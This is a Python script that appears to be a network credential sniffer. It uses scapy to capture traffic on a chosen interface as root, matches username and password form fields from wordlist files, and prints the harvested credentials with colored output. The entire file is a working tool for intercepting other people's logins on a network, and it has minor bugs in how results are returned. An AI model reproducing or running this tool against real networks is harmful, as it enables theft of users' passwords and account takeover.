from urllib import parse
import urllib.parse 
import re
import os

try:
	from termcolor import colored, cprint
	#import colored
except ModuleNotFoundError:
	print("Module termcolor not found ")
	qst = input("you want install it? [Y/n]")
	if qst == "Y" or qst == "":
		os.system("sudo pip install termcolor")
	else:
		print("ok...")
		exit(0)

try:
	from scapy.all import *
except ModuleNotFoundError:
	print("Module scapy not found")
	inst = input("you want install it? [Y/n]")
	if inst == "Y" or inst == "":
		os.system("sudo pip install scapy")
	else:
		print("ok...")
		exit(0)


def banner():
    print("""                                                                    
                            ██████████████                          
                          ▓▓░░░░▒▒░░▒▒░░░░▓▓                        
                      ████░░░░░░░░░░░░░░░░░░██                      
                      ████░░░░░░░░░░░░░░░░░░██                      
                      ████░░░░░░░░░░░░░░░░░░██                      
                      ████░░░░░░░░░░░░░░░░░░██                      
                      ████░░░░░░░░░░░░░░░░░░██                      
                      ████░░░░░░░░░░░░░░░░░░██                      
                      ████░░░░░░░░░░░░░░░░░░██                      
                    ██░░░░░░░░░░░░░░░░░░░░░░░░██                    
                    ██░░░░░░░░░░░░░░░░░░░░░░░░██                    
                    ██░░░░░░░░░░░░░░░░░░░░░░░░██                    
                    ██░░░░░░░░░░░░░░░░░░░░░░░░██                    
                    ██░░░░░░░░░░░░░░░░░░░░░░░░██                    
                  ████░░░░░░░░░░░░░░░░░░░░░░░░████                  
                  ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░██                  
                  ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░██                  
                  ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░██                  
                  ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░██                  
                  ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░██                  
                  ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░██                  
                  ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░██                  
                  ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░██                  
                ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██                
                ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██                
                ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██                
                ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██                
                ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██                
              ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██              
              ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██              
              ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██              
          ▓▓▓▓██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██████          
        ██░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░░░██        
        ██░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░░░██        
      ▓▓░░░░▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓░░░░▓▓▓▓    
      ██░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░░░████    
    ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██  
    ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██  
    ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██  
  ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██
  ██░░░░░░████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░████████░░░░░░░░██
    ██░░░░░░████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░████████░░░░░░░░██  
      ▒▒▓▓▓▓████████▓▓░░░░░░░░░░░░░░░░░░░░░░░░▓▓██████████▓▓▓▓▓▓    
                    ████████░░░░░░░░░░░░░░██████                    
                      ░░░░░░▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░                      
 """)

def get_pass(body):

    user = None
    password = None
    

    user_file = open("userfields.txt", "r")
    stri= ""

    for line in user_file:
        stri+=line
    user_fields = stri.split()

    user_file.close()
   
    
    pass_file = open("passfields.txt", "r")
    stri= ""

    for line in pass_file:
        stri+=line
    pass_fields = stri.split()

    pass_file.close()
    
    #Magic
    for login in  user_fields:
        login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)
        if login_re:
            user = login_re.group()

    for passwd in pass_fields:
        pass_re = re.search('(%s=[^&]+)' % passwd, body, re.IGNORECASE )

        if pass_re:
            passfield = pass_re.group()

    
    if user and passfield:

        real_usr = user
        b = real_usr.split("=",2)

        real_pw = passfield 
        a = real_pw.split("=",2)

        print("\n")
        print(colored('User and Passwords found', 'green', attrs=['bold', 'blink', 'reverse']))

        #decode to utf-8 :)
        encoded_user = colored(b[1], 'green', attrs=['bold'])
        encoded_pass = colored(a[1], 'green', attrs=['bold'])

        print(colored("User: ",'cyan', attrs=['bold'])+urllib.parse.unquote(encoded_user))
        print(colored('Password: ', 'cyan', attrs=['bold'])+urllib.parse.unquote(encoded_pass))


        

def pkt_parser(pkt):

    if pkt.haslayer(TCP) and pkt.haslayer(Raw) and pkt.haslayer(IP):
        body = str(pkt[TCP].payload)

        user_pass = get_pass(body)

        if user_pass != None:
            print(parse.unquote(user_pass[0]))
            print(parse.unquote(user_pass[1]))

    else:
        pass
    
     
def main():

	if os.geteuid() != 0:
		no_root = colored('Please run this script as root ', 'red', attrs=['bold','blink'])
		exit(no_root)

	text = colored('Your network inteface >> ', 'white', attrs=['bold'])
    
	iface = str(input(text))

	print(colored('Waiting for logins...', 'white', attrs=['bold', 'blink']))
	try:
	    sniff(iface= iface, prn=pkt_parser, store=0)
	except KeyboardInterrupt:
	    print(colored('User interrupt', 'red', attrs=['bold', 'blink']))
	    print(colored('exiting...', 'red', attrs=['bold', 'blink']))
	    exit(0)

if __name__ == '__main__':
	main()
